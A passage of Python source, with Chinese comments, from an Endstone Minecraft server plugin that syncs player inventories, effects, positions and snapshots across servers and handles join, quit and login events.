                    return {"T": "BA", "d": base64.b64encode(bytes(tag)).decode("ascii")}
                except Exception:
                    return {"T": "BA", "d": ""}
            if cls == "IntArrayTag":
                try:
                    return {"T": "IA", "d": [int(x) for x in tag]}
                except Exception:
                    return {"T": "IA", "d": []}
            if cls in ("ByteTag", "ShortTag", "IntTag", "LongTag"):
                tc = {"ByteTag": "B", "ShortTag": "S", "IntTag": "I", "LongTag": "L"}[cls]
                try:
                    return {"T": tc, "d": int(tag)}
                except Exception:
                    return {"T": tc, "d": 0}
            if cls in ("FloatTag", "DoubleTag"):
                tc = {"FloatTag": "F", "DoubleTag": "D"}[cls]
                try:
                    return {"T": tc, "d": float(tag)}
                except Exception:
                    return {"T": tc, "d": 0.0}
            if cls == "StringTag":
                try:
                    return {"T": "s", "d": str(tag.value)}
                except Exception:
                    return {"T": "s", "d": ""}
        except Exception:
            return None
        return None

    def _nbt_deserialize(self, obj):
        if obj is None:
            return None
        if not isinstance(obj, dict):
            return None
        if "T" not in obj:
            return self._plain_to_nbt(obj)
        t = obj.get("T")
        d = obj.get("d")
        try:
            from endstone.nbt import (CompoundTag, ListTag, ByteTag, ShortTag, IntTag,
                                      LongTag, FloatTag, DoubleTag, StringTag,
                                      ByteArrayTag, IntArrayTag)
        except Exception:
            return None
        try:
            if t == "C" and isinstance(d, dict):
                comp = {}
                for k, v in d.items():
                    tv = self._nbt_deserialize(v)
                    if tv is not None:
                        comp[str(k)] = tv
                return CompoundTag(comp)
            if t == "L" and isinstance(d, list):
                lt = ListTag()
                for x in d:
                    tv = self._nbt_deserialize(x)
                    if tv is not None:
                        try:
                            lt.append(tv)
                        except Exception:
                            pass
                return lt
            if t == "BA" and isinstance(d, str):
                try:
                    return ByteArrayTag(base64.b64decode(d))
                except Exception:
                    return None
            if t == "IA" and isinstance(d, list):
                try:
                    return IntArrayTag([int(x) for x in d])
                except Exception:
                    return None
            if t in ("B", "S", "I", "L"):
                v = int(d or 0)
                return {"B": ByteTag, "S": ShortTag, "I": IntTag, "L": LongTag}[t](v)
            if t in ("F", "D"):
                v = float(d or 0.0)
                return DoubleTag(v) if t == "D" else FloatTag(v)
            if t == "s":
                return StringTag(str(d or ""))
        except Exception:
            return None
        return None

    def _plain_to_nbt(self, value):
        try:
            from endstone.nbt import (CompoundTag, ListTag, ByteTag, ShortTag, IntTag,
                                      LongTag, FloatTag, DoubleTag, StringTag,
                                      ByteArrayTag, IntArrayTag)
        except Exception:
            return None
        try:
            if isinstance(value, dict):
                comp = {}
                for k, v in value.items():
                    tv = self._plain_to_nbt(v)
                    if tv is not None:
                        comp[str(k)] = tv
                return CompoundTag(comp)
            if isinstance(value, list):
                items = [self._plain_to_nbt(x) for x in value]
                items = [x for x in items if x is not None]
                return ListTag(items)
            if isinstance(value, bool):
                return ByteTag(1 if value else 0)
            if isinstance(value, int):
                if -(2 ** 31) <= value < 2 ** 31:
                    return IntTag(value)
                return LongTag(value)
            if isinstance(value, float):
                return DoubleTag(value)
            if isinstance(value, str):
                return StringTag(value)
            if isinstance(value, bytes):
                return ByteArrayTag(value)
        except Exception:
            return None
        return None

    def _cross_restore_item(self, entry):
        if not isinstance(entry, dict):
            return None
        tname = entry.get("t")
        if not tname:
            return None
        try:
            c = int(entry.get("c") or 1)
        except Exception:
            c = 1
        try:
            data = int(entry.get("data") or 0)
        except Exception:
            data = 0
        try:
            from endstone.inventory import ItemType
            it = ItemType.get(tname)
            if it is None:
                return None
            stack = it.create_item_stack(c)
        except Exception:
            return None
        try:
            stack.data = data
        except Exception:
            pass
        try:
            nbt = entry.get("nbt")
            if isinstance(nbt, dict) and nbt:
                stack.nbt = self._nbt_deserialize(nbt)
                if "bundle" in str(tname):
                    keys = ""
                    if isinstance(nbt.get("d"), dict):
                        keys = ",".join(str(k) for k in nbt["d"].keys())
                    self.logger.warning(
                        "[Synced][bundle] restore type=" + str(tname)
                        + " applied nbt_keys=[" + (keys or "none") + "]"
                    )
        except Exception as e:
            if "bundle" in str(tname):
                self.logger.warning(
                    "[Synced][bundle] restore FAILED type=" + str(tname) + " err=" + str(e)
                )
        return stack

    def _clear_inventory(self, inv):
        """把整个容器清空。

        原实现有两个坑，导致末影箱其实**从来没被清干净过**：

        1. 兜底路径里写 ``ItemStack()``。但 ``ItemStack.__init__`` 的签名是
           ``(self, type: str, amount: int = 1, data: int = 0)`` —— ``type``
           是必填位置参数，无参构造必然 TypeError，然后被 except 吞掉，
           下面的循环就一直在 ``set_item(i, None)``…… 不，是在拿 None 去 set，
           实际上因为 `empty` 已被置 None 于是变成「把槽位设成 None」——
           恰好做对了事，但纯属巧合，且异常被吞得干干净净。

        2. ``inv.clear()`` 只存在于 ``PlayerInventory`` 上（见
           ``endstone/inventory/__init__.pyi`` 里 ``clear`` 定义在
           ``class PlayerInventory(Inventory)`` 内），而 ``player.ender_chest``
           返回的是**裸 Inventory**，所以末影箱每次都走兜底分支。

        这里改成：能不能 clear 先试，不行就显式用 None 逐个槽位置空，
        不再依赖 ItemStack 的构造行为。
        """
        if inv is None:
            return
        try:
            inv.clear()
            return
        except Exception:
            pass
        # 兜底：逐槽位写 None 表示空槽。size 拿不到就按 40 格（玩家背包）试。
        try:
            size = int(getattr(inv, "size", None) or 0)
        except Exception:
            size = 0
        if size <= 0:
            size = 40
        cleared = 0
        for i in range(size):
            try:
                inv.set_item(i, None)
                cleared += 1
            except Exception:
                continue
        if cleared == 0:
            # 两种情况都为空属于正常（玩家本来就没东西），但一个槽都没设成功
            # 说明这个容器根本不是可写 Inventory，值得记一笔。
            try:
                self.logger.warning(
                    f"[跨服] 容器清空失败：类型={type(inv).__name__} size={size}，"
                    f"可能导致旧物品残留"
                )
            except Exception:
                pass

    def _cross_restore_slots(self, inv, entries):
        if inv is None or not isinstance(entries, list):
            return
        self._clear_inventory(inv)
        for entry in entries:
            if not isinstance(entry, dict):
                continue
            try:
                slot = int(entry.get("slot"))
            except Exception:
                continue
            stack = self._cross_restore_item(entry)
            if stack is None:
                continue
            try:
                inv.set_item(slot, stack)
            except Exception:
                pass

    def _cross_restore_ender_chest(self, player, data):
        try:
            inv = getattr(player, "ender_chest", None)
        except Exception:
            inv = None
        if inv is None:
            return
        self._cross_restore_slots(inv, data)

    def _cross_restore_effects(self, player, data):
        """恢复玩家药水效果。

        Endstone 0.11.10 **没有** ``Effect`` / ``add_effect`` API
        （``endstone.potion`` 里无 ``Effect``，``Player``/``Mob`` 上也没有
        ``add_effect``）。原实现直接调 ``player.add_effect(eff)``，
        AttributeError 被吞掉 —— 跨服传送后药水效果**全部静默丢失**。

        这里改为用原版指令实现，效果等价且不依赖不存在的 API：
        先 ``effect clear`` 清干净，再逐条 ``effect give``。

        ★ 实验板功能：开关关闭时直接返回（保持原版行为）。
        """
        if not self._cross_experimental():
            return
        if not isinstance(data, list):
            return
        try:
            name = str(getattr(player, "name", "") or "").strip()
        except Exception:
            return
        if not name:
            return
        try:
            self._run_in_server_thread(self._exec_effect_restore, name, data, timeout=3.0)
        except Exception:
            pass

    def _exec_effect_restore(self, name, data):
        """在主线程用 effect 指令重建药水效果（被 _cross_restore_effects 调度）。"""
        def _dispatch(cmd):
            try:
                self.server.dispatch_command(self.server.command_sender, cmd)
            except Exception:
                pass

        _dispatch(f"effect {name} clear")
        for e in data:
            try:
                tn = str(e.get("t") or "").strip()
                if not tn:
                    continue
                try:
                    a = int(e.get("a") or 0)
                except Exception:
                    a = 0
                a = max(1, a)
                try:
                    d = int(e.get("d") or -1)
                except Exception:
                    d = -1
                # effect give <target> <effect> [seconds] [amplifier] [hideParticles]
                # d 是剩余 tick 数，换算成秒；d<0 视为「无限」用大值近似。
                seconds = 1000000 if d < 0 else max(1, d // 20)
                amp = max(0, a - 1)          # 指令里的 amplifier 从 0 起算
                _dispatch(f"effect {name} {tn} {seconds} {amp} true")
            except Exception:
                continue

    def _cross_restore_state(self, player, data):
        """恢复跨服前的运动/姿态状态（疾跑、潜行、飞行、速度）。

        ★ 实验板功能，开关关闭时**直接返回**（保持原版行为）。

        与 ``_cross_restore_effects`` 不同，这些属性 Endstone 0.11.10
        **是有的**（``Player.is_sprinting`` / ``is_sneaking`` / ``is_flying`` /
        ``allow_flight`` / ``fly_speed`` / ``walk_speed``，见
        ``endstone/__init__.pyi`` 的 Player 段），所以可以直接赋值，不需要指令兜底。

        ★ 关键点：只能用「键存在」判断，不能用 ``data.get(k, False)``。
        旧版本写下的快照里根本没有 ``state`` 这一段，若用默认值兜底，
        每次跨服都会把玩家的飞行/疾跑状态清零 —— 那是比不修更糟的回归。
        """
        if not self._cross_experimental():
            return
        if not isinstance(data, dict):
            return
        state = data.get("state")
        if not isinstance(state, dict):
            state = {}
        # 布尔类状态：严格按「键存在」写回
        for key in ("is_sprinting", "is_sneaking", "is_flying", "allow_flight"):
            if key not in state:
                continue
            try:
                setattr(player, key, bool(state[key]))
            except Exception:
                pass
        # 浮点类速度：fly_speed 在 state 里；walk_speed 历史上是快照的顶层字段
        # （一直只写不读，这里顺手补上写回），两个来源都查一下。
        for key, src in (("fly_speed", state), ("walk_speed", state),
                         ("walk_speed", data)):
            val = src.get(key)
            if val is None:
                continue
            try:
                setattr(player, key, float(val))
            except Exception:
                pass

    def _cross_restore_player(self, player, data):
        if not isinstance(data, dict):
            return
        try:
            h = data.get("health")
            if h is not None:
                try:
                    player.health = float(h)
                except Exception:
                    pass
            mh = data.get("max_health")
            if mh is not None:
                try:
                    player.max_health = float(mh)
                except Exception:
                    pass
            # 下面这几项 Endstone 0.11.10 里没有对应写法：
            #   absorption / hunger / saturation 都不是 Mob 的成员
            #   （Mob 只有 health / max_health / is_gliding）。
            # 保留读取逻辑不删，是为了「将来 Endstone 补上这些属性后
            # 无需改动即可生效」；但现在它们必然走 except 分支，
            # 所以改为用指令做等效补偿（见下），不再静默丢状态。
            ab = data.get("absorption")
            if ab is not None and float(ab or 0) > 0:
                # 吸收伤害：原版没有直接指令，用 absorption 效果的近似替代
                try:
                    name = str(getattr(player, "name", "") or "").strip()
                    if name:
                        self._run_in_server_thread(
                            self._exec_effect_restore, name,
                            [{"t": "absorption", "a": 1, "d": -1}], timeout=3.0)
                except Exception:
                    pass
            fd = data.get("food")
            if fd is not None:
                # 饥饿值：Mob 无 hunger 属性。用 saturation 指令做近似补偿
                try:
                    name = str(getattr(player, "name", "") or "").strip()
                    if name:
                        self._run_in_server_thread(
                            self._exec_effect_restore, name,
                            [{"t": "saturation", "a": 1, "d": 40}], timeout=3.0)
                except Exception:
                    pass
            sat = data.get("saturation")
            if sat is not None and float(sat or 0) > 0:
                try:
                    name = str(getattr(player, "name", "") or "").strip()
                    if name:
                        self._run_in_server_thread(
                            self._exec_effect_restore, name,
                            [{"t": "saturation", "a": 1, "d": 40}], timeout=3.0)
                except Exception:
                    pass
            xp = data.get("xp")
            if xp is not None:
                try:
                    player.exp_level = int(xp)
                except Exception:
                    try:
                        player.level = int(xp)
                    except Exception:
                        pass
            prog = data.get("xp_progress")
            if prog is not None:
                try:
                    player.exp_progress = float(prog)
                except Exception:
                    pass
            tx = data.get("total_xp")
            if tx is not None:
                try:
                    player.total_exp = int(tx)
                except Exception:
                    pass
            gm = data.get("game_mode")
            if gm:
                try:
                    player.game_mode = gm
                except Exception:
                    pass
        except Exception:
            pass
        try:
            pos = data.get("position")
            if isinstance(pos, dict) and pos.get("x") is not None:
                # ★ 必须把维度带上。
                # 快照里一直有 ``dim`` 字段，但恢复时只 teleport 坐标，
                # 于是「在末地退出的玩家」回来会被丢到**主世界**的同名坐标上 ——
                # 若那个坐标正好在基岩层下方或虚空边缘，就是直接摔死/掉虚空。
                # 这是「末地场景」下最严重的一条数据丢失。
                dim = self._cross_normalize_dimension(pos.get("dim"))
                if dim:
                    try:
                        player.teleport((pos["x"], pos["y"], pos["z"]), dimension=dim)
                    except TypeError:
                        # 旧版 Endstone 的 teleport 不认 dimension 关键字，
                        # 退回只传坐标（但至少把维度记进日志，便于排查）
                        self.logger.warning(
                            f"[跨服] 目标维度 {dim} 无法随传送一起设置"
                            f"（当前 Endstone 不支持 dimension 参数），"
                            f"玩家 {getattr(player, 'name', '?')} 仍在原维度"
                        )
                        player.teleport((pos["x"], pos["y"], pos["z"]))
                else:
                    player.teleport((pos["x"], pos["y"], pos["z"]))
        except Exception as e:
            self.logger.warning(f"[跨服] 恢复位置失败: {e}")
        try:
            inv = data.get("inventory")
            if isinstance(inv, list):
                self._cross_restore_slots(getattr(player, "inventory", None), inv)
        except Exception:
            pass
        try:
            self._cross_restore_ender_chest(player, data.get("ender_chest"))
        except Exception:
            pass
        try:
            self._cross_restore_effects(player, data.get("effects"))
        except Exception:
            pass
        try:
            self._cross_restore_state(player, data)
        except Exception:
            pass

    def _warn_bundle_on_join(self, player):
        try:
            cross = getattr(self, "cross", None)
            if cross is None or not cross.enabled():
                return
            # 实验板关闭时不提示 —— 这条提醒是针对「实验版收纳袋同步尚未实现」
            # 而发的，回到原版行为后它就不成立了，继续提示只会误导玩家。
            if not self._cross_experimental():
                return
            inv = getattr(player, "inventory", None)
            if inv is None:
                return
            has_bundle = False
            for i in range(40):
                try:
                    st = inv.get_item(i)
                except Exception:
                    break
                if st is None or getattr(st, "amount", 0) <= 0:
                    continue
                tname = ""
                try:
                    it = getattr(st, "type", None)
                    tname = str(getattr(it, "id", None) or "")
                except Exception:
                    tname = ""
                if "bundle" in tname:
                    has_bundle = True
                    break
            if not has_bundle:
                return
            msg = "§c[跨服] §e检测到你身上有收纳袋：跨服时袋内物品不会同步，请在切换服务器前先把袋子里的物品取出来。"
            try:
                player.send_message(msg)
            except Exception:
                try:
                    player.send_tip(msg)
                except Exception:
                    try:
                        player.send_popup(msg)
                    except Exception:
                        pass
        except Exception:
            pass

    def _cross_restore_async(self, player, uuid):
        try:
            cross = getattr(self, "cross", None)
            if cross is None:
                return
            snap = cross.get_player_data(uuid)
            if not snap:
                return
            try:
                self._run_in_server_thread(self._cross_restore_player, player, snap, timeout=4.0)
            except Exception:
                pass
        except Exception:
            pass

    def _cross_put_async(self, uuid, name, snap):
        try:
            cross = getattr(self, "cross", None)
            if cross is not None:
                cross.put_player_data(uuid, name, snap)
        except Exception:
            pass

    # ---------------------------------------------------- 周期快照 / 掉线保护
    #
    # 背景（这是用户明确提出的需求）：
    #   「最好玩家突然从服务器里断开，也可以正常使用。」
    #
    # 原来的设计只在 ``on_player_quit`` 里做一次快照。问题是掉线场景下
    #   * 客户端崩溃 / 网络断 / 被 kick，都不走正常的退出流程；
    #   * 等 Endstone 派发 PlayerQuitEvent 时，``event.player`` 的背包、
    #     药水效果、位置可能正在析构，读到的是**空壳**；
    #   * 而这段读取被 ``except Exception: pass`` 包着，读空了也不报错，
    #     紧接着把这个空快照 put 上去，**直接覆盖掉上一次的好数据**。
    #   → 玩家掉线一次，跨服存档就被洗一次。这比「不同步」更糟。
    #
    # 对策分三层：
    #   1) 每 5 秒给所有在线玩家打一次快照（不依赖 quit 事件）；
    #   2) 快照写库前先过 ``_cross_snapshot_sane`` 校验，坏数据直接拒收；
    #   3) 指纹去重，内容没变就不写盘（cross.py 每次 put 都会全量原子写
    #      cross_db.json，不去重会把磁盘打爆）。

    def _cross_snapshot_sane(self, snap):
        """判断一份跨服快照是否「可信」。

        返回 ``(ok: bool, reason: str)``。判据刻意宽松 —— 只要不是明确
        坏掉就放行，避免误伤「玩家真的把背包清空了」这种合法情况：

        * 不是 dict / 空 dict           → 拒收（典型的读取失败）
        * 三个容器字段全缺失            → 拒收（快照结构不完整）
        * health 缺失或非有限数         → 拒收（玩家对象已失效的强信号）
        """
        if not isinstance(snap, dict) or not snap:
            return False, "empty"
        has_container = any(k in snap for k in ("inventory", "ender_chest", "effects"))
        if not has_container:
            return False, "no-container"
        # position 也要在：读不到位置的快照会把玩家传送回 (0,0,0)
        if not isinstance(snap.get("position"), dict):
            return False, "no-position"
        h = snap.get("health")
        try:
            hv = float(h)
        except Exception:
            return False, "no-health"
        if hv != hv or hv < 0:                     # NaN 或负数
            return False, "bad-health"
        return True, ""

    def _cross_snapshot_fingerprint(self, snap):
        """给快照算个内容指纹，用来跳过无变化的写盘。

        只有 ``json`` 能直接序列化（NaN/Infinity 会被写成非法 JSON），
        所以失败时返回 None，调用方按「指纹不可用 → 照常写」处理。
        """
        try:
            return hashlib.sha1(
                json.dumps(snap, sort_keys=True, ensure_ascii=False, default=str).encode("utf-8")
            ).hexdigest()
        except Exception:
            return None

    def _cross_periodic_snapshot(self):
        """每 5 秒给所有在线玩家打快照（由 scheduler 调度，跑在主线程）。"""
        if self._periodic_stopped:
            return
        try:
            cross = getattr(self, "cross", None)
            if cross is None or not cross.enabled() or not cross.interop("player_data"):
                return
        except Exception:
            return
        try:
            players = list(self.server.online_players)
        except Exception:
            return
        for p in players:
            try:
                self._cross_periodic_one(p)
            except Exception:
                continue

    def _cross_periodic_one(self, player):
        """单个玩家的周期快照：三道闸依次过 —— 校验 / 去重 / 投递。"""
        # 双保险：周期任务在关闭时根本不会注册，但万一被别的路径调到，
        # 这里再挡一次，确保关闭状态下不会有任何额外快照/写盘。
        if not self._cross_experimental():
            return
        try:
            uuid = str(getattr(player, "unique_id", None) or getattr(player, "uuid", None) or "")
            name = str(getattr(player, "name", "") or "")
        except Exception:
            return
        if not uuid:
            return
        snap = self._cross_snapshot_player(player)
        ok, why = self._cross_snapshot_sane(snap)
        if not ok:
            # 只在降级瞬间告警一次，避免每 5 秒刷屏
            key = getattr(self, "_cross_bad_snap_warned", None)
            if key is None:
                key = set()
                self._cross_bad_snap_warned = key
            if uuid not in key:
                key.add(uuid)
                self.logger.warning(
                    f"[跨服] 玩家 {name or uuid} 的快照不可信（{why}），已跳过本次上传，"
                    f"保留服务端上一次的有效数据"
                )
            return
        # 快照恢复正常后，允许下次再告警
        warned = getattr(self, "_cross_bad_snap_warned", None)
        if warned is not None:
            warned.discard(uuid)

        fp = self._cross_snapshot_fingerprint(snap)
        fps = getattr(self, "_cross_last_fp", None)
        if fps is None or fp is None:
            pass
        else:
            if fps.get(uuid) == fp:
                return                              # 内容没变，不写盘
        if fp is not None:
            if fps is None:
                fps = {}
                self._cross_last_fp = fps
            fps[uuid] = fp

        # 投递到后台线程：slave 模式下 put 是同步 HTTP，扔在主线程会卡 tick
        try:
            self._executor.submit(self._cross_put_async, uuid, name, snap)
        except Exception:
            try:
                threading.Thread(
                    target=self._cross_put_async, args=(uuid, name, snap), daemon=True
                ).start()
            except Exception:
                pass

    def _cross_push_whitelist_now(self):
        try:
            cross = getattr(self, "cross", None)
            if cross is None or not cross.enabled():
                return
            # server.whitelist 不存在，改走指令回显（见 _local_whitelist_names）
            names = sorted(self._local_whitelist_names())
            cross.push_whitelist(names)
        except Exception as e:
            self.logger.warning(f"[跨服] 白名单推送失败: {e}")

    def _cross_push_bans_now(self):
        try:
            cross = getattr(self, "cross", None)
            if cross is None or not cross.enabled():
                return
            entries = {}
            try:
                # 正确属性是 ban_list（bans 不存在），条目列表是 .entries
                bl = getattr(self.server, "ban_list", None)
                if bl is not None:
                    for b in bl.entries:
                        try:
                            entries[str(b.name)] = True
                        except Exception:
                            pass
            except Exception:
                entries = {}
            cross.push_bans(entries)
        except Exception as e:
            self.logger.warning(f"[跨服] 封禁推送失败: {e}")

    def _cross_push_whitelist(self):
        try:
            threading.Thread(target=self._cross_push_whitelist_now, daemon=True).start()
        except Exception:
            pass

    def _cross_push_bans(self):
        try:
            threading.Thread(target=self._cross_push_bans_now, daemon=True).start()
        except Exception:
            pass

    # ---------------------------------------------------- 子插件事件转发
    #
    # Endstone 的事件注册是 Plugin 级、面向插件自身方法的，子插件模块没法直接注册。
    # 所以这里给常用事件各挂一个转发方法，统一走 _gm_dispatch()，
    # 由 _gm_event_map 按事件类型分发给子插件通过 gm.event.on() 注册的函数。

    #: 已挂好转发的事件类型名，供 gm.event.supported() 查询
    _gm_event_supported = (
        "PlayerChatEvent", "BroadcastMessageEvent", "PlayerJoinEvent",
        "PlayerQuitEvent",
    )

    def _gm_dispatch(self, event) -> None:
        """把事件分发给子插件注册的处理函数。每个 handler 独立隔离异常。"""
        table = getattr(self, "_gm_event_map", None)
        if not table:
            return
        try:
            handlers = list(table.get(type(event)) or [])
        except Exception:
            return
        for fn in handlers:
            try:
                fn(event)
            except Exception as e:
                self.logger.error(f"[子插件] 事件 {type(event).__name__} 处理异常: {e}")

    @event_handler
    def on_gm_chat(self, event: PlayerChatEvent):
        self._gm_dispatch(event)

    @event_handler
    def on_gm_broadcast(self, event: BroadcastMessageEvent):
        self._gm_dispatch(event)

    @event_handler
    def on_gm_join(self, event: PlayerJoinEvent):
        self._gm_dispatch(event)

    @event_handler
    def on_gm_quit(self, event: PlayerQuitEvent):
        self._gm_dispatch(event)

    @event_handler
    def on_broadcast(self, event: BroadcastMessageEvent):
        try:
            msg = event.message
            if isinstance(msg, str):
                self._append_message("broadcast", "服务器", msg)
        except Exception:
            pass

    @event_handler
    def on_map_initialize(self, event: MapInitializeEvent):
        """地图被初始化时，顺手把「渲染器丢了」的地图画补回来。

        为什么要单独挂这个事件 —— 进服恢复（``_restore_mapart_async``）
        只在玩家**进服那一刻**跑一次，覆盖不到下面两种情况：

          1. **服务器重启后，玩家一直没重登**
             地图对象从存档重建时渲染器就是空的，仅靠进服恢复要等到
             玩家下次登录才补。而这期间别人看展示框上的地图、或者
             玩家自己打开地图，看到的都是白的。

          2. **地图被放进展示框 / 交给别人**
             展示框走实体渲染路径，不经过 ``send_map``。但只要渲染器
             在，原版就会正常把像素广播出去 —— 所以这里补上渲染器，
             展示框那边也就正常了。

        ⚠ 这个事件是**原版主动触发**的，意味着它可能：
          * 在任何线程被触发 → 只做「查表 + 挂渲染器」，不碰磁盘
          * 被非常频繁地触发（每次地图初始化一次）→ 必须极快
            （一次字典查表 + 一次 renderers 判空，纳秒级）

        所以这里**绝不读盘、绝不 send_map**，只挂渲染器。
        像素从哪来？——正常路径下根本走不到这里（渲染器还在）；
        只有服务端重启后才需要补，而那时像素文件在磁盘上 ——
        但我们不能在事件里读盘。折中：**交给进服恢复去读盘补**，
        这里只做「发现渲染器丢失就记一条日志」，方便排查。

        换句话说：这个事件的作用是**让问题可见**，真正的修复仍走进服恢复。
        """
        try:
            view = event.map
            if view is None:
                return
            try:
                mid = int(view.id)
            except Exception:
                return

            # 只关心我们自己的地图画。查索引是纯内存操作（有缓存的话）。
            # 这里刻意**不用** _mapart_of —— 那是按玩家查的。
            # 用一份轻量的「我们管过哪些 id」判断更合适，见 _mapart_has。
            if not self._mapart_has(mid):
                return

            try:
                have = len(list(view.renderers or []))
            except Exception:
                have = 0

            if have <= 0:
                self.logger.warning(
                    f"[地图画] 地图 {mid} 被初始化，但渲染器为空"
                    f"（服务端重启后属正常现象；进入对应的服务器后玩家"
                    f"重新登录会自动补回。若长期如此请检查像素文件）")
        except Exception:
            pass

    @_optional_event_handler(PlayerLoginEvent)
    def on_player_login(self, event: PlayerLoginEvent):
        """登录阶段拦截可信度不足的玩家。

        为什么优先用登录事件：玩家还没真正进服就被挡下，
        不会出现「先看到自己出生再被踢」的体验。

        ⚠ 本回调跑在**服务器主线程**上，所以只查内存缓存、绝不读盘。
        缓存没命中就放行（fail-open）—— 宁可放过，也不要因为档案
        还没加载完就把所有玩家挡在门外。

        ⚠⚠ 类型标注 ``event: PlayerLoginEvent`` **绝不能省**。
        详见 on_player_chat 处的说明：Endstone 注册时会校验处理器签名，
        无标注的方法会被判为 ``invalid event handler signature`` 并
        **整条丢弃**。本方法的标注曾经漏掉过一次，直接后果是登录拦截
        静默失效（日志里只有一行 ERROR，玩家侧表现为「先出生再被踢」），
        只剩 on_player_join 的踢出兜底在工作。
        """
        if PlayerLoginEvent is None:
            return
        try:
            ok, text = self.trust.check_login(event.player)
            if ok:
                return
            try:
                event.kick_message = text
            except Exception:
                pass

            try:
                event.is_cancelled = True
            except Exception:
                try:
                    event.cancel()
                except Exception:
                    pass
        except Exception as e:
            self.logger.warning(f"[可信度] 登录拦截异常（放行）: {e}")

    @event_handler
    def on_player_join(self, event: PlayerJoinEvent):
        try:
            self._append_message("join", event.player.name, "加入了服务器")
        except Exception:
            pass

        # 行为记录：进入服务器（第 3 档）
        try:
            rec = self._behavior_recorder()
            if rec is not None:
                p = event.player
                x, y, z, dim = self._behavior_pos(p)
                rec.record("join", str(p.name), "加入", self._behavior_level(),
                           x, y, z, dim)
        except Exception:
            pass

        try:
            self._maybe_cloud_check(event.player)
        except Exception:
            pass

        self._broadcast_official(
            "join_to_qq", "join_format", "[游戏] %s 加入了服务器",
            name=event.player.name,
        )

        hub = getattr(self, "qq_hub", None)
        if hub is not None:
            try:
                hub.websocket_relay("join", name=event.player.name)
            except Exception:
                pass

        cross = getattr(self, "cross", None)
        if cross is not None and cross.enabled() and cross.interop("player_data"):
            try:
                p = event.player
                uuid = str(getattr(p, "unique_id", None) or getattr(p, "uuid", None) or "")
                if uuid:
                    threading.Thread(target=self._cross_restore_async, args=(p, uuid), daemon=True).start()
                    threading.Thread(target=self._cross_put_async, args=(uuid, p.name, self._cross_snapshot_player(p)), daemon=True).start()
                try:
                    self._warn_bundle_on_join(p)
                except Exception:
                    pass
            except Exception:
                pass

        cross = getattr(self, "cross", None)
        if cross is not None and cross.enabled() and cross.interop("chat"):
            try:
                cross.broadcast_sys(f"§a{event.player.name} §f加入了服务器")
            except Exception:
                pass

        try:
            self._maybe_handle_join_binding(event.player)
        except Exception:
            pass

        # 地图画恢复：玩家重登后补发地图贴图。
        #
        # 为什么必须放后台线程：这里跑在主线程（tick 线程），而恢复要读磁盘
        # （每人几张、每张几十 KB）。在主线程里读文件会直接卡 tick，
        # 张数一多 TPS 就掉。所以只起一个线程，真正的读盘在主线程之外做，
        # 读完了再由那个线程调度回主线程执行 send_map。
        #
        # 与上面的 _cross_restore_async 是同一个模式。
        try:
            threading.Thread(
                target=self._restore_mapart_async,
                args=(event.player, event.player.name),
                daemon=True,
            ).start()
        except Exception:
            pass

        try:
            self._process_delayed_tasks()
        except Exception:
            pass

        self._regex_event_player(EVENT_PLAYER_JOIN, event.player.name)

        # 可信度计分：主线程只抠标量丢线程池，读盘/计分都在后台做。
        # 这里同时承担「登录那道没拦下时」的踢出兜底。
        try:
            self.trust.begin_join(event.player)
        except Exception:
            pass

    @event_handler
    def on_player_quit(self, event: PlayerQuitEvent):
        try:
            self._append_message("quit", event.player.name, "离开了服务器")
        except Exception:
            pass

        # 行为记录：离开服务器（第 3 档）
        # ★ 离服时玩家实体可能已经在卸载，坐标大概率取不到 ——
        #   _behavior_pos 会返回空，记录仍然照写（谁、何时离开是有用的）。
        try:
            rec = self._behavior_recorder()
            if rec is not None:
                p = event.player
                x, y, z, dim = self._behavior_pos(p)
                rec.record("quit", str(p.name), "离开", self._behavior_level(),
                           x, y, z, dim)
        except Exception:
            pass

        self._broadcast_official(
            "leave_to_qq", "leave_format", "[游戏] %s 离开了服务器",
            name=event.player.name,
        )

        hub = getattr(self, "qq_hub", None)
        if hub is not None:
            try:
                hub.websocket_relay("leave", name=event.player.name)
            except Exception:
                pass

        cross = getattr(self, "cross", None)
        if cross is not None and cross.enabled() and cross.interop("player_data"):
            try:
                p = event.player
                uuid = str(getattr(p, "unique_id", None) or getattr(p, "uuid", None) or "")
                if uuid:
                    snap = self._cross_snapshot_player(p)
                    # 掉线/被踢时 event.player 可能已析构，读出来的是空壳。
                    # 拒收坏快照，保留周期快照写下的上一份好数据。
                    ok, _why = self._cross_snapshot_sane(snap)
                    if ok:
                        threading.Thread(target=self._cross_put_async, args=(uuid, p.name, snap), daemon=True).start()
            except Exception:
                pass

        cross = getattr(self, "cross", None)
        if cross is not None and cross.enabled() and cross.interop("chat"):
            try:
                cross.broadcast_sys(f"§c{event.player.name} §f离开了服务器")
            except Exception:
                pass

        self._regex_event_player(EVENT_PLAYER_LEFT, event.player.name)

    def _regex_event_player(self, event_type: str, player_name: str) -> None:
        """把游戏事件交给正则引擎（进服 / 离服 / 发言）。

        ⚠ 这一步跑在**服务器主线程**上。引擎里的动作含网络发送与磁盘
        操作，所以整件事丢进后台线程 —— 在主线程里等 HTTP 返回会直接
        卡 tick、掉 TPS。

        引擎本身没加载时静默跳过：正则只是 QQ 机器人链路的一个可选项，
        不该让它在没启用时给每个事件都留一条异常日志。
        """
        engine = getattr(self, "regex_engine", None)
        if engine is None:
            return
        name = str(player_name or "")
        if not name:
            return
        try:
            if event_type == EVENT_PLAYER_JOIN:
                fn = engine.on_mc_player_join
                args = (name,)
            elif event_type == EVENT_PLAYER_LEFT:
                fn = engine.on_mc_player_left
                args = (name,)
            else:
                return
            threading.Thread(target=fn, args=args, daemon=True).start()
        except Exception as e:
            self.logger.warning(f"[正则引擎] 派发游戏事件失败: {e}")

    def _regex_event_chat(self, player_name: str, message: str) -> None:
        """玩家发言 → 正则引擎（后台线程，理由同上）。"""
        engine = getattr(self, "regex_engine", None)
        if engine is None:
            return
        try:
            threading.Thread(
                target=engine.on_mc_player_chat,
                args=(str(player_name or ""), str(message or "")),
                daemon=True,
            ).start()
        except Exception as e:
            self.logger.warning(f"[正则引擎] 派发聊天事件失败: {e}")

    def _append_message(self, mtype: str, player_name: str, message: str):
        try:
            with self._messages_lock:
                self._message_seq += 1
                self._messages.append({
                    "id": self._message_seq,
                    "time": datetime.now().strftime("%H:%M:%S"),
                    "type": mtype,
                    "player": player_name,
                    "message": message,
                })
        except Exception:
            pass

    def _resolve_data_dir(self) -> Optional[Path]:
        """解析插件数据目录 = Endstone 的 ``data_folder``（``plugins/<插件名>/``）。

        ★ v6.16.39 改造说明
        -------------------
        旧实现在 ``data_folder`` 取不到时返回**相对路径**
        ``Path("plugins/endstone-greenmoon-panel/data")``，有双重问题：

